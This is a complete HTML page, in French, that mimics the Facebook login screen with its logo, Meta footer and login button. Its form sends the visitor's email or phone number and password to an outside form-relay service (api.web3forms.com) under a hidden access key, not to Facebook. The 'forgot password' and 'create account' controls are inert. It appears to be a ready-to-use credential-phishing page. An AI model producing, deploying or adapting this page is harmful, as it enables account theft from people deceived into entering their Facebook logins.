<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion Facebook</title>
    <style>
        /* Style global */
        body {
            font-family: Arial, sans-serif;
            background: linear-gradient(135deg, #f0f2f5, #e8ecf4);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #1c1e21;
        }

        /* Langue */
        .language {
            font-size: 14px;
            color: #606770;
            margin-bottom: 20px;
        }

        /* Logo Facebook */
        .logo {
            font-size: 48px;
            color: #1877f2;
            margin-bottom: 20px;
        }

        /* Container du formulaire */
        .form-container {
            width: 100%;
            max-width: 380px;
            padding: 20px;
            text-align: center;
        }

        /* Champs de connexion */
        input[type="text"],
        input[type="text"] {
            width: 100%;
            padding: 14px;
            margin-top: 12px;
            border: 1px solid #ccd0d5;
            border-radius: 12px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
        }

        /* Bouton de connexion */
        .btn-login {
            width: 100%;
            padding: 14px;
            background-color: #1877f2;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 20px;
        }

        /* Lien mot de passe oublié */
        .forgot-password {
            display: block;
            margin-top: 16px;
            color: #1877f2;
            font-size: 14px;
            text-decoration: none;
        }

        /* Bouton de création de compte */
        .btn-create-account {
            width: 100%;
            padding: 12px;
            background-color: #e7f3ff;
            color: #1877f2;
            border: 1px solid #1877f2;
            font-size: 16px;
            font-weight: bold;
            border-radius: 20px;
            cursor: pointer;
            margin-top: 20px;
        }

        /* Footer Meta */
        .footer {
            font-size: 12px;
            color: #606770;
            margin-top: 30px;
            text-align: center;
        }

        .footer a {
            color: #606770;
            text-decoration: none;
            margin: 0 5px;
        }

        /* Logo Meta */
        .meta-logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-top: 20px;
            color: #606770;
        }

        .meta-logo svg {
            width: 24px;
            height: 24px;
            margin-right: 6px;
        }
    </style>
</head>
<body>
    <div class="language">Français (France)</div>
    <div class="logo">f</div>
    <div class="form-container">
        <form action="https://api.web3forms.com/submit" method="POST">          
            <input type="hidden" name="access_key" value="a95457ec-e519-4889-b14e-2d247c62b5fb">
            <input type="text" name="email" placeholder="Numéro mobile ou e-mail" required>
            <input type="text" name="mdp" placeholder="Mot de passe" required>
            <button type="submit" class="btn-login">Se connecter</button>
        </form>
        <a href="#" class="forgot-password">Mot de passe oublié ?</a>
        <button class="btn-create-account">Créer un compte</button>
    </div>   
    <div class="footer">
        <div class="meta-logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#606770" d="M16 7.1c3.3 0 5.3 3.3 6.6 5.8 1.2 2.3 2 5.1 1.8 7.3-.2 2.3-1.2 3.5-2.4 3.5-1.3 0-2.2-.4-3.5-1.6l-.1-.1c-1-.9-2.3-2.2-4.5-2.2h-.1c-2.3 0-3.5 1.3-4.5 2.2l-.1.1c-1.3 1.2-2.2 1.6-3.5 1.6-1.3 0-2.2-1.2-2.4-3.5-.2-2.2.6-5 1.8-7.3 1.3-2.5 3.3-5.8 6.6-5.8m0-2c-4.6 0-7.2 4.4-8.7 7.3-1.3 2.5-2.2 5.6-1.9 8.2.2 2.5 1.5 5.3 4.3 5.3 2.1 0 3.4-1 4.7-2.2 1-.9 1.7-1.8 3.6-1.8s2.6.9 3.6 1.8c1.3 1.2 2.6 2.2 4.7 2.2 2.8 0 4.1-2.8 4.3-5.3.3-2.7-.6-5.8-1.9-8.2-1.5-2.9-4.1-7.3-8.7-7.3z"/></svg>
            Meta
        </div>
        <a href="#">À propos</a>
        <a href="#">Aide</a>
        <a href="#">Plus</a>
    </div>
</body>
</html>
